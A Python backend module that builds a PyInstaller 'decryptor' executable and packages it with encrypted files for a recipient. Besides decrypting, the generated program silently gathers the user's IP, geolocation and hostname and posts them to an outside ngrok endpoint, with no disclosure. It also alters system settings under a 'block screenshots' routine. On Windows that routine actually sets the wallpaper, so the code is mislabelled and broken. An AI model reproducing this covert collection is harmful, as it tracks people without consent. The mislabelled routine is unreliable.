import os
import logging
import base64
from fastapi import HTTPException
import zipfile
import subprocess

logging.basicConfig(level=logging.DEBUG)

def generate_exe(key: bytes, encrypted_file_paths: list, file_extensions: dict, username: str, group_name: str):
    encoded_key = base64.b64encode(key).decode('utf-8')
    extensions_str = str(file_extensions)

    script_dir = 'temp'
    if not os.path.exists(script_dir):
        os.makedirs(script_dir)
    script_path = os.path.join(script_dir, "decryptor.py")
    
    decryptor_script = """
import os
import sys
import logging
from cryptography.fernet import Fernet
import base64
import atexit
import requests
import json
import geocoder
import platform
import ctypes
import socket
import requests
from datetime import datetime
import signal

logging.basicConfig(level=logging.DEBUG, filename='decryptor_log.txt', filemode='w')

key = base64.b64decode("{encoded_key}")
fernet = Fernet(key)

# Convert the string representation back to a dictionary
file_extensions = {extensions_str}

decrypted_files = []

def block_screenshots():
    if platform.system() == "Windows":
        try:
            ctypes.windll.user32.SystemParametersInfoW(20, 0, "C:\\Windows\\System32\\drivers\\etc\\hosts", 3)
            logging.info("Screenshot capability blocked on Windows")
        except Exception as e:
            logging.error(f"Failed to block screenshots on Windows: {{str(e)}}")
    elif platform.system() == "Darwin":  # macOS
        try:
            result = os.system("defaults write com.apple.screencapture disable -bool true && killall SystemUIServer")
            if result == 0:
                logging.info("Screenshot capability blocked on macOS")
            else:
                logging.error("Failed to block screenshots on macOS")
        except Exception as e:
            logging.error(f"Failed to block screenshots on macOS: {{str(e)}}")

def unblock_screenshots():
    if platform.system() == "Windows":
        try:
            ctypes.windll.user32.SystemParametersInfoW(20, 0, None, 3)
            logging.info("Screenshot capability unblocked on Windows")
        except Exception as e:
            logging.error(f"Failed to unblock screenshots on Windows: {{str(e)}}")
    elif platform.system() == "Darwin":  # macOS
        try:
            result = os.system("defaults write com.apple.screencapture disable -bool false && killall SystemUIServer")
            if result == 0:
                logging.info("Screenshot capability unblocked on macOS")
            else:
                logging.error("Failed to unblock screenshots on macOS")
        except Exception as e:
            logging.error(f"Failed to unblock screenshots on macOS: {{str(e)}}")

def get_location():
    try:
        response = requests.get('https://ipinfo.io')
        location_data = response.json()
        if 'loc' in location_data:
            loc = location_data['loc'].split(',')
            location_data['latitude'] = loc[0]
            location_data['longitude'] = loc[1]
        return {{
            "ip": location_data.get("ip"),
            "city": location_data.get("city"),
            "region": location_data.get("region"),
            "country": location_data.get("country"),
            "latitude": location_data.get("latitude"),
            "longitude": location_data.get("longitude")
        }}
    except Exception as e:
        logging.error(f"Error retrieving location: {{str(e)}}")
        return None

def send_group_info():
    location = get_location()
    print(location)
    if location:
        pc_name = socket.gethostname()
        now = datetime.now()
        data = {{
            "group_name": "{group_name}",
            "pc_name": pc_name,
            "location": f"{{location['city']}} {{location['region']}} {{location['country']}}",
            "ip": location['ip'],
            "date": now.strftime("%Y-%m-%d"),
            "time": now.strftime("%H:%M:%S")
        }}
        print(data)
        headers = {{'Content-Type': 'application/json'}}
        try:
            response = requests.post(
                'https://87ce-2401-4900-9023-d455-e146-9f1a-33f4-4f62.ngrok-free.app/sendLocation', 
                json=data,
                headers=headers
            )
            if response.status_code == 200:
                print("Group information sent successfully")
            else:
                print(f"Failed to send group information. Status code: {{response.status_code}}")
        except Exception as e:
            print(f"Error sending group information: {{str(e)}}")


def decrypt_files():
    try:
        block_screenshots()
        current_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
        logging.debug(f"Current directory: {{current_dir}}")
        files_before = set(os.listdir(current_dir))
        logging.debug(f"Files before decryption: {{files_before}}")
        for filename in os.listdir(current_dir):
            if filename.endswith("_encrypted"):
                try:
                    logging.debug(f"Attempting to decrypt: {{filename}}")
                    file_path = os.path.join(current_dir, filename)
                    with open(file_path, "rb") as encrypted_file:
                        encrypted_data = encrypted_file.read()
                    decrypted_data = fernet.decrypt(encrypted_data)
                    original_extension = file_extensions.get(filename.split('_encrypted')[0], "")
                    decrypted_filename = filename[:-10] + original_extension
                    decrypted_path = os.path.join(current_dir, decrypted_filename)
                    with open(decrypted_path, "wb") as decrypted_file:
                        decrypted_file.write(decrypted_data)
                    os.remove(file_path)
                    logging.debug(f"Successfully decrypted: {{filename}} to {{decrypted_filename}}")
                    decrypted_files.append(decrypted_path)
                except Exception as e:
                    logging.error(f"Error decrypting {{filename}}: {{str(e)}}")
        files_after = set(os.listdir(current_dir))
        new_files = files_after - files_before
        logging.info(f"Newly created files: {{new_files}}")
        if decrypted_files:
            logging.info(f"Decrypted files: {{', '.join([os.path.basename(f) for f in decrypted_files])}}")
        else:
            logging.warning("No files were decrypted.")
        logging.info("Decryption process completed.")
    except Exception as e:
        logging.error(f"Error in decrypt_files: {{str(e)}}")

def reencrypt_files():
    try:
        unblock_screenshots()
        for decrypted_file in decrypted_files:
            logging.debug(f"Re-encrypting file: {{decrypted_file}}")
            with open(decrypted_file, "rb") as f:
                data = f.read()
            encrypted_data = fernet.encrypt(data)
            encrypted_path = decrypted_file + "_encrypted"
            with open(encrypted_path, "wb") as encrypted_file:
                encrypted_file.write(encrypted_data)
            os.remove(decrypted_file)
            logging.debug(f"Successfully re-encrypted: {{decrypted_file}} to {{encrypted_path}}")
        logging.info("Re-encryption process completed.")
    except Exception as e:
        logging.error(f"Error in reencrypt_files: {{str(e)}}")

# Register reencrypt_files to run on process exit
atexit.register(reencrypt_files)
def handle_exit_signal(signum, frame):
    reencrypt_files()
    sys.exit(0)

# Bind signals to handle process termination properly
signal.signal(signal.SIGINT, handle_exit_signal)  # Handle Ctrl+C
signal.signal(signal.SIGTERM, handle_exit_signal)
if __name__ == "__main__":
    try:
        send_group_info()
        decrypt_files()
        input("Files decrypted. Press Enter to re-encrypt and exit...")
        while True:
            pass
    except Exception as e:
        logging.error(f"Unhandled exception: {{str(e)}}")
        print(f"An error occurred. Please check the decryptor_log.txt file for details.")
    """
    with open(script_path, "w") as f:
        f.write(decryptor_script)
    
    windows_exe_path = None

    try:
        logging.debug("Generating Windows executable")
        
        windows_exe_name = f"decryptor_{username}.exe"
        windows_command = [
            "pyinstaller",
            "--onefile",
            "--name", windows_exe_name,
            "--add-data", f"{script_path};.",
            "--hidden-import=cryptography",
            "--hidden-import=requests",
            "--hidden-import=geocoder",
            script_path
        ]
        
        subprocess.run(windows_command, check=True)
        windows_exe_path = os.path.join("dist", windows_exe_name)

        logging.debug("Creating ZIP file with executable and encrypted files")
        
        # Create zip file with the executable and encrypted files
        zip_path = os.path.join(script_dir, f"{username}_package.zip")
        with zipfile.ZipFile(zip_path, 'w') as zipf:
            if windows_exe_path and os.path.exists(windows_exe_path):
                zipf.write(windows_exe_path, os.path.basename(windows_exe_path))
            for file_path in encrypted_file_paths:
                zipf.write(file_path, os.path.basename(file_path))

        return zip_path

    except subprocess.CalledProcessError as e:
        logging.error(f"Error running pyinstaller: {e}")
        raise HTTPException(status_code=500, detail=f"Failed to create executable: {str(e)}")
    except Exception as e:
        logging.error(f"Unexpected error: {e}")
        raise HTTPException(status_code=500, detail=f"Unexpected error: {str(e)}")
    finally:
        # Clean up temporary files
        if os.path.exists(script_path):
            os.remove(script_path)
        if os.path.exists("build"):
            import shutil
            shutil.rmtree("build")
        if windows_exe_path and os.path.exists(windows_exe_path):
            os.remove(windows_exe_path)